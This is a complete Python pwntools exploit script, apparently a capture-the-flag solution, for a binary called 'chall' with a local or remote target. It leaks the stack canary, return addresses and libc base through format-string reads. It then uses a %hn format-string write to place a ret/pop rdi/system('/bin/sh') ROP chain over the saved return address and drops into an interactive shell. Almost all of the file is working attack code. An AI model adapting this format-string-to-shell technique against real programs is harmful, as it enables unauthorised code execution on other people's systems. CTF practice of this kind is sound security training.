#!/usr/bin/env python3
from pwn import *
import re

context.binary = ELF("./chall")
context.arch = "amd64"
context.os = "linux"
context.log_level = "info"

LIBC_PATH = "./libs/libc-2.31.so"
LD_PATH = "./libs/ld-linux-x86-64.so.2"

elf = context.binary
libc = ELF(LIBC_PATH)

BUF_INDEX_BASE = 6  # index where buffer offset 0 appears in %n$p


def start():
    if args.REMOTE:
        return remote("34.123.57.171", 44107)
    return process([LD_PATH, "./chall"], env={"LD_LIBRARY_PATH": "./libs"})


def menu_sync(p):
    p.recvuntil(b"4. Exit")


def leak_values(p):
    menu_sync(p)
    idxs = [71, 72, 73, 77]  # canary, saved_rbp, saved_rip, libc_ret
    fmt = b"|" + b"|".join([f"%{i}$p".encode() for i in idxs]) + b"|\x00"
    p.sendline(b"2")
    p.recvuntil(b"ritual:")
    p.sendline(fmt)
    out = p.recvuntil(b"4. Exit")

    part = out.split(b"The ritual echoes...")[-1]
    fields = [f for f in part.split(b"|") if f.startswith(b"0x")]
    if len(fields) < 4:
        raise ValueError(f"leak parse failed: {fields}")

    canary = int(fields[0], 16)
    saved_rbp = int(fields[1], 16)
    saved_rip = int(fields[2], 16)
    libc_ret = int(fields[3], 16)
    return canary, saved_rbp, saved_rip, libc_ret


def build_fmt(entries, arg_base):
    fmt = b""
    printed = 0
    for i, (addr, val) in enumerate(entries):
        target = val
        if target < printed:
            target += 0x10000
        inc = target - printed
        if inc:
            fmt += f"%{inc}c".encode()
        fmt += f"%{arg_base + i}$hn".encode()
        printed = target
    return fmt


def build_payload(writes):
    entries = []
    for addr, value in writes.items():
        for i in range(4):
            part = (value >> (i * 16)) & 0xffff
            entries.append((addr + i * 2, part))
    entries.sort(key=lambda x: x[1])

    arg_base = BUF_INDEX_BASE
    for _ in range(6):
        fmt = build_fmt(entries, arg_base)
        addr_offset = len(fmt) + 1  # NUL terminator
        addr_offset = (addr_offset + 7) & ~7
        new_arg_base = BUF_INDEX_BASE + (addr_offset // 8)
        if new_arg_base == arg_base:
            break
        arg_base = new_arg_base

    addr_offset = len(fmt) + 1
    addr_offset = (addr_offset + 7) & ~7
    pad = addr_offset - (len(fmt) + 1)

    payload = fmt + b"\x00" + (b"A" * pad)
    for addr, _ in entries:
        payload += p64(addr)
    return payload


def exploit():
    p = start()

    canary, saved_rbp, saved_rip, libc_ret = leak_values(p)

    log.info(f"canary     = {hex(canary)}")
    log.info(f"saved_rbp  = {hex(saved_rbp)}")
    log.info(f"saved_rip  = {hex(saved_rip)}")
    log.info(f"libc_ret   = {hex(libc_ret)}")

    pie_base = saved_rip - 0x1468
    libc_base = libc_ret - libc.symbols["__libc_start_main"] - 243

    log.info(f"pie_base   = {hex(pie_base)}")
    log.info(f"libc_base  = {hex(libc_base)}")

    pop_rdi = pie_base + ROP(elf).find_gadget(["pop rdi", "ret"]).address
    ret = pie_base + ROP(elf).find_gadget(["ret"]).address
    system = libc_base + libc.symbols["system"]
    bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))

    log.info(f"pop_rdi    = {hex(pop_rdi)}")
    log.info(f"ret        = {hex(ret)}")
    log.info(f"system     = {hex(system)}")
    log.info(f"/bin/sh    = {hex(bin_sh)}")

    # saved_rbp belongs to caller (main). ritual rbp is saved_rbp - 0x20
    saved_rip_addr = (saved_rbp - 0x20) + 8

    writes = {
        saved_rip_addr: ret,
        saved_rip_addr + 8: pop_rdi,
        saved_rip_addr + 16: bin_sh,
        saved_rip_addr + 24: system,
    }

    payload = build_payload(writes)
    if len(payload) > 0x200:
        raise ValueError(f"payload too long: {len(payload)}")

    p.sendline(b"2")
    p.recvuntil(b"ritual:")
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    exploit()
